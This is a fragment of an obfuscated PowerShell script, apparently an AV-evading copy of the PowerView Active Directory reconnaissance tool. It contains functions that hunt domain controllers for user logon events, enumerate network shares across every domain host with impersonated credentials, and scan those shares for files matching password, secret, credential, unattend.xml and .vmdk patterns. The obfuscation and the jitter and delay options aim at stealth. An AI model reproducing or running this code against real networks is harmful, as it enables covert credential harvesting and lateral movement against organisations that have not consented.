        elseif (${P`SBouNDP`ARAMET`erS}[("{0}{1}{4}{2}{3}"-f'Use','rGroupI','ntit','y','de')] -or (-not ${pSbOUndPA`RAm`E`Te`RS}[("{1}{0}"-f 'ilter','F')])) {

            ${g`RoupseArc`hera`RGU`mE`N`Ts} = @{
                ("{1}{0}"-f'y','Identit') = ${u`SErg`R`O`U`pidEntity}
                ("{0}{1}{2}" -f'R','ecurs','e') = ${Tr`UE}
            }
            &("{0}{3}{1}{2}"-f 'Wr','te-Ver','bose','i') ('Use'+'rG'+'ro'+'upIde'+'ntity: '+"$UserGroupIdentity")
            if (${p`SBo`U`NDPARAm`ETErs}[("{2}{1}{0}"-f 'main','Do','User')]) { ${GRou`PS`ea`RcHeRaR`guME`NtS}[("{2}{0}{1}" -f'ma','in','Do')] = ${U`SErD`oma`In} }
            if (${p`Sb`ouN`DPAraMET`erS}[("{1}{0}{3}{2}"-f'rSe','Use','e','archBas')]) { ${G`ROu`pSeaRcH`eRa`R`gUme`Nts}[("{0}{1}{3}{2}" -f'Sea','rch','e','Bas')] = ${UseRSeaR`Ch`BA`Se} }
            if (${psbOUND`Pa`R`AMeTERS}[("{1}{0}" -f 'ver','Ser')]) { ${gRou`P`seA`RcHEraRguMe`N`TS}[("{0}{1}"-f 'Ser','ver')] = ${SErV`ER} }
            if (${psb`ounDp`ARAm`eteRs}[("{1}{0}{3}{2}" -f'rchSc','Sea','pe','o')]) { ${GR`OuP`SearCh`eRa`Rgum`en`Ts}[("{2}{0}{1}{3}"-f 'c','hSco','Sear','pe')] = ${sEar`C`Hsc`oPe} }
            if (${pSBO`UNdPaRA`M`eTeRS}[("{1}{3}{0}{2}"-f 'ltPageSi','Res','ze','u')]) { ${grOUP`sea`RChE`RA`RG`U`Ments}[("{4}{0}{3}{2}{1}"-f'sultPa','ize','S','ge','Re')] = ${r`eSUL`Tpagesi`ze} }
            if (${pSbouN`dp`Ar`AME`TERS}[("{3}{1}{0}{2}{4}" -f 'L','erverTime','imi','S','t')]) { ${g`Roup`SEaR`cHE`Ra`RGUm`EnTs}[("{1}{2}{3}{0}"-f'imit','Serv','erTi','meL')] = ${Se`R`V`eR`TiMElImIT} }
            if (${P`SboUNdp`AR`AMet`e`RS}[("{1}{0}{2}"-f't','Tombs','one')]) { ${GR`o`UpS`EAR`Ch`eRaRGU`meNTS}[("{3}{1}{2}{0}" -f 'ne','ombs','to','T')] = ${tom`BSt`one} }
            if (${pSBOuNDPa`Ra`M`etERs}[("{2}{1}{0}" -f 'dential','e','Cr')]) { ${GRouPse`Arc`hE`Ra`RGu`MeNTs}[("{1}{2}{3}{0}"-f'ntial','C','r','ede')] = ${cRE`d`eNt`iAL} }
            ${tA`Rg`etUSeRs} = &("{4}{2}{1}{0}{3}"-f 'upMemb','Gro','n','er','Get-Domai') @GroupSearcherArguments | &("{2}{1}{0}{3}"-f'lect-','e','S','Object') -ExpandProperty ("{0}{1}{2}"-f 'Me','mberNam','e')
        }

        if (${pSbOuND`pA`RA`Met`E`RS}[("{2}{0}{3}{1}"-f'o','terName','C','mpu')]) {
            ${TA`RG`ETcoMPUt`Ers} = ${CO`MPUte`RNA`Me}
        }
        else {

            ${DcsE`Arc`h`eR`A`RGUme`Nts} = @{
                ("{1}{0}" -f 'P','LDA') = ${tr`UE}
            }
            if (${pS`BOU`NDpaRAme`TE`Rs}[("{0}{1}"-f 'Domai','n')]) { ${dcsEArCheR`A`RgUM`e`N`Ts}[("{1}{0}"-f'in','Doma')] = ${DOMA`In} }
            if (${pSBOU`NDp`ARa`ME`T`ErS}[("{0}{1}{2}" -f'Se','r','ver')]) { ${DC`Sear`c`hERaRguMENtS}[("{1}{0}"-f 'ver','Ser')] = ${SE`R`VeR} }
            if (${PS`BO`UnDp`A`RamETErS}[("{2}{0}{1}"-f'd','ential','Cre')]) { ${DcSea`Rc`hERaR`g`UMents}[("{0}{1}{2}" -f'C','r','edential')] = ${cR`EDE`NTIaL} }
            &("{0}{1}{3}{2}"-f'Writ','e-Ver','e','bos') ('[Find'+'-Do'+'mai'+'nU'+'serE'+'ven'+'t] '+'Qu'+'e'+'rying '+'for'+' '+'d'+'om'+'ain '+'control'+'ler'+'s'+' '+'in'+' '+'domain'+':'+' '+"$Domain")
            ${TA`Rg`etCoMpU`TerS} = &("{5}{1}{3}{2}{0}{4}"-f 'nt','t-Do','nCo','mai','roller','Ge') @DCSearcherArguments | &("{1}{0}{3}{2}"-f 'l','Se','ect','ect-Obj') -ExpandProperty ("{3}{0}{2}{1}"-f 'nsh','me','ostna','d')
        }
        if (${T`ARGetCOmp`UTErs} -and (${Ta`R`G`eTcomp`UTErS} -isnot [System.Array])) {
            ${taRgEtcO`mpu`T`Ers} = @(,${taRgEt`Comp`UtE`Rs})
        }
        &("{1}{2}{0}{3}"-f'e-','Wr','it','Verbose') "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        &("{0}{1}{2}{3}" -f 'W','rite-','Ve','rbose') ('[Find-Doma'+'inUser'+'Event]'+' '+'Target'+'Compute'+'r'+'s'+' '+"$TargetComputers")
        if (${TA`RGeT`C`OMputeRS}."le`NgTH" -eq 0) {
            throw ("{9}{7}{1}{2}{4}{12}{11}{5}{6}{3}{8}{10}{0}"-f'merate','e','rE','u','ve','sts f','o','mainUs','nd','[Find-Do',' to enu','o ho','nt] N')
        }

        ${HOsTeN`UM`B`loCk} = {
            Param(${co`mPU`Te`RnAmE}, ${sTART`Ti`ME}, ${eN`d`TiME}, ${Max`evE`Nts}, ${tAR`geT`US`erS}, ${Fi`lt`er}, ${cRe`De`Nti`Al})

            ForEach (${tARg`E`TComP`UTer} in ${COmP`U`T`ERnamE}) {
                ${uP} = &("{4}{0}{3}{1}{2}"-f'es','io','n','t-Connect','T') -Count 1 -Quiet -ComputerName ${tARG`e`TcOmp`UTeR}
                if (${uP}) {
                    ${Do`mAi`NuSeRe`VEnTa`RGs} = @{
                        ("{3}{0}{2}{1}"-f 'omp','Name','uter','C') = ${TaRgeT`COMP`UTeR}
                    }
                    if (${sta`R`TTI`Me}) { ${DoMaIN`Us`EreV`entARGS}[("{1}{2}{0}" -f 'rtTime','St','a')] = ${stA`RTTI`Me} }
                    if (${en`D`TIme}) { ${d`OM`A`I`NuSerEv`enTa`RGs}[("{0}{1}{2}" -f 'En','dTi','me')] = ${e`NDtiMe} }
                    if (${m`AXevEn`TS}) { ${DOm`Ai`NUSer`E`VeNTA`Rgs}[("{2}{1}{0}"-f 'ts','n','MaxEve')] = ${mA`xE`VenTs} }
                    if (${c`R`e`deNtial}) { ${doM`Ai`NuSeR`EVE`Nta`RgS}[("{2}{1}{0}" -f 'al','redenti','C')] = ${Cr`EDEnt`ial} }
                    if (${fI`l`TER} -or ${T`ARgE`TUsE`Rs}) {
                        if (${TA`Rge`Tu`SErS}) {
                            &("{3}{4}{2}{0}{1}"-f'ser','Event','ainU','Ge','t-Dom') @DomainUserEventArgs | &("{2}{1}{0}{3}" -f'je','Ob','Where-','ct') {${tarGE`T`UsErs} -contains ${_}."Ta`RgE`T`USER`NaMe"}
                        }
                        else {
                            ${OP`erA`T`OR} = 'or'
                            ${F`Ilter}."K`EYs" | &("{2}{1}{0}"-f'Object','rEach-','Fo') {
                                if ((${_} -eq 'Op') -or (${_} -eq ("{2}{0}{1}" -f 'per','ator','O')) -or (${_} -eq ("{2}{0}{1}" -f 'a','tion','Oper'))) {
                                    if ((${f`I`lTER}[${_}] -match '&') -or (${fiLT`Er}[${_}] -eq 'and')) {
                                        ${OpER`AT`oR} = 'and'
                                    }
                                }
                            }
                            ${kE`ys} = ${F`iLTER}."KE`ys" | &("{2}{0}{1}" -f're-O','bject','Whe') {(${_} -ne 'Op') -and (${_} -ne ("{1}{0}{2}"-f 'o','Operat','r')) -and (${_} -ne ("{2}{1}{3}{0}" -f 'on','pe','O','rati'))}
                            &("{1}{4}{2}{0}{3}" -f 'E','Ge','r','vent','t-DomainUse') @DomainUserEventArgs | &("{3}{1}{2}{0}" -f'ject','-','Ob','ForEach') {
                                if (${oP`ErAT`Or} -eq 'or') {
                                    ForEach (${k`Ey} in ${k`eYs}) {
                                        if (${_}."$Key" -match ${f`I`LTER}[${K`Ey}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {

                                    ForEach (${k`Ey} in ${kE`yS}) {
                                        if (${_}."$Key" -notmatch ${filt`eR}[${k`Ey}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &("{3}{2}{0}{1}" -f 'inUse','rEvent','-Doma','Get') @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {

        if (${PsB`O`Un`dPAr`AMeTErs}[("{0}{1}" -f'D','elay')] -or ${p`sBOun`DPARam`EteRS}[("{3}{0}{1}{2}" -f 'S','u','ccess','StopOn')]) {

            &("{0}{3}{2}{1}"-f 'Wri','se','erbo','te-V') "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            &("{1}{0}{2}" -f 'ite-Verbos','Wr','e') ('[Find-'+'D'+'om'+'ai'+'n'+'UserEvent] '+'Del'+'ay:'+' '+"$Delay, "+'J'+'itter: '+"$Jitter")
            ${c`O`UNter} = 0
            ${RanD`No} = &("{2}{1}{0}" -f 'ject','w-Ob','Ne') ("{2}{0}{1}{3}"-f 'm.','Rand','Syste','om')

            ForEach (${tar`Getcom`puTer} in ${tar`GETc`O`MPuTE`RS}) {
                ${cO`Unt`eR} = ${C`Oun`TER} + 1

                &("{3}{0}{2}{1}" -f't','ep','art-Sle','S') -Seconds ${R`AN`dNo}.("{0}{1}"-f 'Nex','t').Invoke((1-${jiTT`er})*${d`E`lAy}, (1+${jiT`TEr})*${d`E`lay})

                &("{1}{0}{2}" -f'it','Wr','e-Verbose') "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                ${Res`Ult} = &("{0}{1}{2}{3}" -f 'Invok','e','-Comma','nd') -ScriptBlock ${H`oS`T`ENuMBL`ock} -ArgumentList ${ta`RgetC`o`mpUtER}, ${sTA`R`TT`IMe}, ${EnDt`i`mE}, ${MaX`Ev`ENTS}, ${tarGE`TusE`RS}, ${f`iL`Ter}, ${crE`DE`Nt`IAL}
                ${RESu`Lt}

                if (${r`E`SulT} -and ${S`To`p`On`SUCcesS}) {
                    &("{2}{0}{1}"-f 'te-Verbo','se','Wri') ("{8}{1}{7}{4}{9}{2}{0}{5}{3}{6}" -f'r found','Find-DomainUse','et use','ng ear','r',', returni','ly','rEvent] Ta','[','g')
                    return
                }
            }
        }
        else {
            &("{1}{0}{2}{3}"-f'-Ve','Write','r','bose') ('[Find-'+'Dom'+'a'+'inUserEv'+'ent] '+'Us'+'in'+'g '+'t'+'hr'+'ead'+'ing '+'with'+' '+'th'+'read'+'s: '+"$Threads")

            ${SCR`IpTPa`RaMs} = @{
                ("{0}{2}{1}"-f'St','rtTime','a') = ${s`TA`RTtiME}
                ("{1}{0}" -f'Time','End') = ${e`Nd`Time}
                ("{0}{1}"-f 'MaxEv','ents') = ${m`AXEv`ENTS}
                ("{3}{2}{1}{0}"-f 'sers','tU','rge','Ta') = ${T`ArGe`T`UsErS}
                ("{1}{0}"-f'r','Filte') = ${fi`LT`ER}
                ("{3}{1}{0}{2}"-f 'enti','d','al','Cre') = ${CreD`ent`Ial}
            }

            &("{3}{1}{0}{2}"-f 'hreadedFu','ew-T','nction','N') -ComputerName ${taRGE`T`Co`mPuTe`RS} -ScriptBlock ${hOs`T`EnUm`BL`OCK} -ScriptParameters ${s`CrIp`Tp`ARaMS} -Threads ${thR`EADS}
        }
    }
}

function fI`N`D-dom`AiNsH`ARe {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{1}{2}{0}" -f 'ess','ould','Proc','PSS','h'}, '')]
    [OutputType({"{2}{1}{4}{0}{5}{3}"-f'hareI','i','PowerV','o','ew.S','nf'})]
    Param(
        [Parameter(pOSITiON = 0, vaLuefROMpIPeLinE = ${tR`UE}, valUefroMpIpelINebYprOpERtynAME = ${T`RUE})]
        [Alias({"{3}{1}{0}{2}"-f 'a','HostN','me','DNS'})]
        [String[]]
        ${COm`PuTER`NA`ME},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Do','main'})]
        [String]
        ${comP`U`TE`R`DOmain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoMPu`Te`RldAPfi`LTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${co`MPUt`eRSEarCHB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{4}{3}" -f'ing','Operat','Sy','em','st'})]
        [String]
        ${c`Om`PutEr`oPe`RATiNgsySTeM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}"-f'Pa','Servic','e','ck'})]
        [String]
        ${Com`P`UTeR`sErVI`Ce`pACK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'iteName','S'})]
        [String]
        ${COM`puTE`RSI`TENaME},

        [Alias({"{3}{1}{0}{2}"-f 'c','c','ess','CheckA'})]
        [Switch]
        ${CHeCksH`A`R`E`AcC`ess},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{4}{3}{1}{0}"-f 'r','e','Do','Controll','main'})]
        [String]
        ${sEr`V`er},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{2}{1}{0}"-f'Level','e','On'}, {"{1}{0}{2}" -f'ubtre','S','e'})]
        [String]
        ${S`eAR`CHScoPE} = ("{2}{0}{1}" -f 'btr','ee','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`UlTpA`gESi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ErvErtIMELi`M`it},

        [Switch]
        ${tom`B`stoNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEDE`N`TiAL} =  ${p`KFEZN}::"E`MPty",

        [ValidateRange(1, 10000)]
        [Int]
        ${d`ELAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`ItTeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${th`R`eaDS} = 20
    )

    BEGIN {

        ${coM`P`Ut`Er`sEaRcheR`ARGume`NtS} = @{
            ("{0}{1}{2}"-f 'Proper','ti','es') = ("{0}{2}{1}"-f 'dns','me','hostna')
        }
        if (${PS`BOUn`DpaRam`ETeRS}[("{2}{0}{3}{1}" -f 'erD','ain','Comput','om')]) { ${co`m`p`UteRsE`A`Rc`HerARGumeNts}[("{0}{1}"-f'Dom','ain')] = ${COMPutEr`dO`MaIN} }
        if (${PsBoUNd`para`M`eterS}[("{5}{2}{4}{3}{1}{0}" -f'r','e','p','PFilt','uterLDA','Com')]) { ${cOmPutE`Rs`EarCHe`Ra`RGumENts}[("{1}{2}{0}"-f 'r','LDAPFilt','e')] = ${co`M`p`UTerLdApFIl`T`eR} }
        if (${PSBOu`NDPaRA`M`E`TErS}[("{0}{3}{2}{4}{1}" -f'Comp','ase','c','uterSear','hB')]) { ${cO`Mpute`RS`e`ARc`He`R`Argu`meNTS}[("{0}{2}{1}"-f 'Sear','se','chBa')] = ${C`O`MpUt`ERseaRCHbasE} }
        if (${PsbOU`NDpA`RAmet`ERS}[("{0}{1}{2}"-f'Unconstr','ai','ned')]) { ${C`OmPU`TerSEA`RcHeRaRg`UMEn`Ts}[("{3}{0}{2}{4}{1}"-f 'rai','d','n','Unconst','e')] = ${u`Nc`onst`RA`ined} }
        if (${PS`BoU`NDPAR`Ame`T`Ers}[("{0}{2}{3}{1}{5}{4}"-f'Co','Opera','m','puter','gSystem','tin')]) { ${CO`MpUTe`RsE`A`RC`heRAR`gUMENtS}[("{4}{2}{0}{3}{1}"-f 'a','m','r','tingSyste','Ope')] = ${o`pErA`TING`sY`stem} }
        if (${p`sBOun`DPARa`MeTerS}[("{3}{0}{2}{1}"-f'e','ack','P','ComputerServic')]) { ${cOmpuTeRS`EaR`cher`ArgumE`NTS}[("{2}{0}{1}" -f 'c','ePack','Servi')] = ${S`Erv`ICEpACk} }
        if (${PSb`ou`N`DpaR`A`MEtErS}[("{1}{2}{0}"-f 'puterSiteName','C','om')]) { ${ComP`Ut`ErSE`A`RcH`E`RA`RGUMentS}[("{0}{2}{1}" -f 'Si','ame','teN')] = ${s`ite`N`AmE} }
        if (${PSBOUNd`PAR`AMe`TERS}[("{1}{0}"-f 'r','Serve')]) { ${CoMPuT`e`Rs`EArch`eRa`RGUmeN`TS}[("{1}{0}" -f 'rver','Se')] = ${SERV`er} }
        if (${P`SbOu`NdParAM`eTE`RS}[("{0}{1}{2}"-f 'Se','arch','Scope')]) { ${cOm`pu`Te`RSEARc`heRaRGUMENTs}[("{3}{2}{1}{0}" -f 'Scope','ch','r','Sea')] = ${S`eaRChs`co`pE} }
        if (${ps`BoUNDP`Ar`Ame`TerS}[("{0}{1}{2}{3}{4}"-f'Resu','lt','Pa','geSiz','e')]) { ${C`o`MPUTe`R`s`EA`R`CheraRgUMe`NTS}[("{1}{3}{2}{0}" -f 'ize','Result','S','Page')] = ${rESu`LTpaG`Esi`Ze} }
        if (${PS`BoU`NdPARAmEt`E`Rs}[("{1}{0}{2}{3}"-f 'rverTi','Se','meLim','it')]) { ${coM`PuteR`SEA`RCHe`RA`RgumE`N`Ts}[("{3}{1}{2}{4}{0}" -f'it','rTime','L','Serve','im')] = ${se`Rv`ERT`IMEl`imIt} }
        if (${P`sBo`U`NDpAR`Ame`TerS}[("{0}{1}{2}" -f'T','omb','stone')]) { ${ComPUt`ErSeA`R`C`HeRARgUmE`NTs}[("{1}{2}{0}"-f 'e','T','ombston')] = ${t`O`Mbsto`NE} }
        if (${pSbo`UndPaRa`Met`E`Rs}[("{1}{2}{0}{3}" -f 'nti','Cre','de','al')]) { ${comPut`eRsea`Rc`HE`RArguMenTs}[("{1}{2}{0}"-f'ial','Cred','ent')] = ${CREdE`Nt`IAl} }

        if (${PsbO`UndPAR`A`mEters}[("{1}{2}{0}{3}" -f 'ute','Com','p','rName')]) {
            ${T`ARg`etc`o`mPUtErS} = ${com`put`erNAme}
        }
        else {
            &("{0}{2}{1}{3}"-f 'W','V','rite-','erbose') ("{1}{5}{4}{6}{3}{7}{8}{2}{0}"-f'in','[F','e doma','in','nd-DomainShare] Que','i','rying computers ',' t','h')
            ${T`ArG`e`TcOMPu`TeRs} = &("{0}{3}{4}{1}{2}" -f'G','pu','ter','et-Doma','inCom') @ComputerSearcherArguments | &("{0}{1}{2}{3}"-f'S','el','ect-Obje','ct') -ExpandProperty ("{0}{2}{1}"-f 'dn','tname','shos')
        }
        &("{2}{0}{1}" -f'-Ve','rbose','Write') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (${T`ARGE`TcOMp`UTeRS}."L`en`gTH" -eq 0) {
            throw ("{0}{3}{7}{8}{2}{1}{4}{5}{6}" -f'[Find-DomainShare]',' ','d to',' No h','enum','era','te','os','ts foun')
        }

        ${hOs`TEn`U`MbLOCK} = {
            Param(${coMP`UTeRn`A`ME}, ${c`h`ec`KshAReaCCESS}, ${tOKen`haN`dLE})

            if (${TokENh`AN`dle}) {

                ${nU`ll} = &("{4}{3}{1}{5}{2}{6}{0}" -f'ion','pe','on','nvoke-UserIm','I','rs','at') -TokenHandle ${TOkeNhAn`d`LE} -Quiet
            }

            ForEach (${Ta`RGet`comP`UTEr} in ${CoMpu`TeRNa`mE}) {
                ${uP} = &("{0}{2}{3}{1}"-f 'Test-Con','ction','n','e') -Count 1 -Quiet -ComputerName ${tar`gET`COMpu`TEr}
                if (${Up}) {

                    ${sHA`R`ES} = &("{2}{0}{1}{3}"-f'e','t-NetSha','G','re') -ComputerName ${ta`RgeTCOmp`U`T`er}
                    ForEach (${Sh`ArE} in ${S`HA`Res}) {
                        ${S`HaRe`Name} = ${s`H`ARE}."n`Ame"

                        ${p`AtH} = '\\'+${TArGe`TCOMPU`TeR}+'\'+${shAr`Ena`Me}

                        if ((${sH`Ar`EnaME}) -and (${SHa`R`eN`Ame}.("{1}{0}" -f 'm','tri').Invoke() -ne '')) {

                            if (${chE`cksHArea`CCE`sS}) {

                                try {
                                    ${Nu`Ll} =   ${xjq`N7}::("{1}{0}"-f'es','GetFil').Invoke(${p`ATH})
                                    ${S`HArE}
                                }
                                catch {
                                    &("{3}{2}{4}{0}{1}" -f'-Verbos','e','ri','W','te') ('Error'+' '+'a'+'cces'+'sing '+'share'+' '+'p'+'ath '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ${sha`RE}
                            }
                        }
                    }
                }
            }

            if (${T`OKEn`HA`NDle}) {
                &("{3}{4}{0}{1}{2}" -f'-RevertT','oSel','f','I','nvoke')
            }
        }

        ${Lo`GoNTO`Ken} = ${nu`ll}
        if (${p`sboU`NDPa`Rame`TErs}[("{0}{2}{1}" -f 'C','dential','re')]) {
            if (${P`SBOuN`d`P`ARAme`TErS}[("{0}{1}"-f 'D','elay')] -or ${PSbo`U`N`dpArAmeT`ers}[("{0}{2}{1}{3}" -f'S','nSuc','topO','cess')]) {
                ${L`o`goNTOKEN} = &("{0}{4}{2}{3}{1}" -f'I','ersonation','ke-Us','erImp','nvo') -Credential ${CR`EdEnT`i`AL}
            }
            else {
                ${loG`onToK`eN} = &("{2}{3}{1}{5}{0}{6}{7}{4}" -f's','ke-U','In','vo','n','serImper','onati','o') -Credential ${c`R`Ed`entIaL} -Quiet
            }
        }
    }

    PROCESS {

        if (${ps`BOU`NDPArAMeT`e`Rs}[("{1}{0}"-f 'y','Dela')] -or ${ps`B`OUndpARA`M`Eters}[("{1}{0}{2}" -f 'pOnSuc','Sto','cess')]) {

            &("{1}{0}{2}{3}" -f 'rite','W','-','Verbose') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            &("{0}{1}{2}"-f'Writ','e-Verb','ose') ('[Find'+'-Do'+'main'+'Shar'+'e] '+'De'+'lay'+': '+"$Delay, "+'J'+'itter'+': '+"$Jitter")
            ${counT`er} = 0
            ${Ran`d`No} = &("{1}{2}{0}"-f 't','New-Obje','c') ("{3}{2}{0}{1}"-f 'a','ndom','em.R','Syst')

            ForEach (${Ta`R`GETcoMPu`T`ER} in ${tA`RgeTc`O`MP`UT`eRS}) {
                ${C`o`UNTer} = ${Cou`NTer} + 1

                &("{1}{0}{2}" -f'tar','S','t-Sleep') -Seconds ${ran`D`No}.("{0}{1}" -f'Nex','t').Invoke((1-${j`it`TEr})*${DeL`Ay}, (1+${J`ITtER})*${dE`laY})

                &("{0}{1}{3}{2}"-f 'Wr','ite','bose','-Ver') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{2}{0}{1}" -f'e-C','ommand','Invok') -ScriptBlock ${H`O`s`T`EnumbLocK} -ArgumentList ${TaRG`ETCOmpu`TeR}, ${cH`EC`K`shAReACc`ESs}, ${LoGo`NtO`kEN}
            }
        }
        else {
            &("{1}{0}{3}{2}"-f'te-Ve','Wri','se','rbo') ('[Fin'+'d-Doma'+'in'+'S'+'hare] '+'Using'+' '+'thr'+'e'+'ading '+'wi'+'th '+'threads'+': '+"$Threads")

            ${ScRiP`Tp`AR`AMS} = @{
                ("{2}{4}{3}{0}{1}"-f'e','ss','Che','areAcc','ckSh') = ${cHEcks`HA`REAcce`Ss}
                ("{0}{1}{3}{2}" -f'To','ke','Handle','n') = ${lOG`O`NTokEN}
            }

            &("{0}{3}{1}{5}{4}{2}{6}"-f'Ne','d','t','w-Threa','c','edFun','ion') -ComputerName ${Tar`GEt`CO`MPute`Rs} -ScriptBlock ${Ho`STeN`UM`BlOck} -ScriptParameters ${sCr`IPtpA`RaMs} -Threads ${TH`REa`dS}
        }
    }

    END {
        if (${L`o`gOntO`KeN}) {
            &("{1}{0}{3}{2}{4}" -f'voke-Revert','In','e','ToS','lf') -TokenHandle ${LogOn`TOk`en}
        }
    }
}

function fiND-I`N`TERe`StIngdOmAiNsH`AREfI`le {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f'PSS','hould','cess','Pro'}, '')]
    [OutputType({"{4}{2}{0}{1}{3}"-f'ndF','i','w.Fou','le','PowerVie'})]
    [CmdletBinding(dEfaULTpAraMEtERSeTnaMe = {"{3}{0}{2}{1}" -f 'ecif','on','icati','FileSp'})]
    Param(
        [Parameter(poSiTioN = 0, VaLuEFROmpiPELIne = ${tR`UE}, vALUefrompiPelINebYpropERtYnAme = ${t`RuE})]
        [Alias({"{2}{0}{3}{1}" -f 'NSH','ame','D','ostN'})]
        [String[]]
        ${c`ompUTeRN`A`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Co`mPutE`R`d`OMAin},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMPUTERl`D`A`pfiLTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`mpU`TERse`ARCHbAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'O','ngSystem','perati'})]
        [String]
        ${CoMPUTeROp`eR`ATi`Ngs`ysTeM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}"-f 'ervi','ceP','S','ack'})]
        [String]
        ${c`OmP`U`T`ERS`ervIcEPaCk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'e','Site','Nam'})]
        [String]
        ${c`Om`PUte`RSI`TenaME},

        [Parameter(ParaMeterSEtNaME = "fi`lEsPecIfiCa`Ti`oN")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}"-f'Sear','erm','chT','s'}, {"{0}{1}"-f 'Te','rms'})]
        [String[]]
        ${inCLu`De} = @(("{1}{2}{0}"-f'*','*passwo','rd'), ("{2}{3}{0}{1}" -f'n','sitive*','*','se'), ("{1}{0}"-f 'admin*','*'), ("{1}{0}"-f'*','*login'), ("{0}{1}" -f '*se','cret*'), ("{2}{0}{1}{3}"-f 'tte','nd*','una','.xml'), ("{1}{0}" -f 'mdk','*.v'), ("{2}{1}{0}" -f 'ds*','e','*cr'), ("{3}{0}{2}{1}" -f'de','*','ntial','*cre'), ("{1}{0}{2}" -f'co','*.','nfig')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({(("{2}{0}{1}"-f'n7xn7x','n','7xn7x')) -crEplaCe ([CHAR]55+[CHAR]120+[CHAR]110),[CHAR]92})]
        [Alias({"{0}{1}" -f 'Shar','e'})]
        [String[]]
        ${SHaR`eP`Ath},

        [String[]]
        ${exC`lUDe`ds`Hares} = @('C$', ((('Admin0d'+'A')-rePLaCe'0dA',[char]36)), (('Pr'+'int'+'{0}')  -f[ChAr]36), (('IPC{'+'0'+'}') -f  [Char]36)),

        [Parameter(pARAMETersetNaME = "F`I`Les`PEcIFI`CATioN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${lAst`Ac`cEs`sTIme},

        [Parameter(pARameteRsetNaME = "fiL`e`sPECI`Fi`C`ATIon")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${lA`STW`RIteTime},

        [Parameter(parameTERsETnAmE = "F`i`lES`Pe`CIfI`caTIOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${cRE`At`IoN`TiME},

        [Parameter(pARAMEtersetname = "o`FFICed`O`cs")]
        [Switch]
        ${Off`ICe`Do`cS},

        [Parameter(PAramETERsEtnamE = "frES`h`ExEs")]
        [Switch]
        ${FR`eshEx`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{0}{1}{2}"-f'nt','ro','ller','DomainC','o'})]
        [String]
        ${s`eRV`eR},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{2}{0}{1}"-f 'L','evel','One'}, {"{1}{2}{0}" -f 'ee','Su','btr'})]
        [String]
        ${s`eARCHSco`Pe} = ("{1}{0}" -f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`EsulT`p`AGes`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRv`ErTI`me`l`IMiT},

        [Switch]
        ${t`OM`BsTone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEde`Nt`I`AL} =  ( &("{2}{3}{0}{1}"-f'I','TeM','gEt','-chILd')  ("{0}{2}{3}{1}"-f 'vaR','ZN','IaBLE:','pkfE')  )."vaL`Ue"::"Em`PTY",

        [ValidateRange(1, 10000)]
        [Int]
        ${d`El`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jit`T`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thr`eADS} = 20
    )

    BEGIN {
        ${co`mp`Ut`ERSEaRCHEra`Rg`UMe`NTS} = @{
            ("{0}{2}{1}{3}" -f'Prop','tie','er','s') = ("{0}{2}{3}{1}" -f 'd','me','nshos','tna')
        }
        if (${PSb`ouN`DPARa`M`etERS}[("{1}{0}{2}{3}" -f'pute','Com','rDo','main')]) { ${COmPutERs`E`Ar`CHE`R`A`RgUMeNTS}[("{0}{1}" -f 'Dom','ain')] = ${Co`MP`UTerd`OMAiN} }
        if (${PsboUn`DP`ARaME`Ters}[("{3}{0}{1}{4}{2}"-f'puter','L','APFilter','Com','D')]) { ${cO`mpuTERS`E`Ar`Ch`e`RaRGuMEnTs}[("{3}{0}{2}{1}" -f'A','ter','PFil','LD')] = ${c`Om`PuterlDapfI`L`T`Er} }
        if (${psBOun`D`p`Ara`Mete`RS}[("{4}{1}{0}{3}{2}"-f 'uter','p','se','SearchBa','Com')]) { ${C`Omput`erSe`Ar`CHErArGuMents}[("{2}{0}{1}" -f 'hBa','se','Searc')] = ${COmPuter`SE`A`R`c`hBASe} }
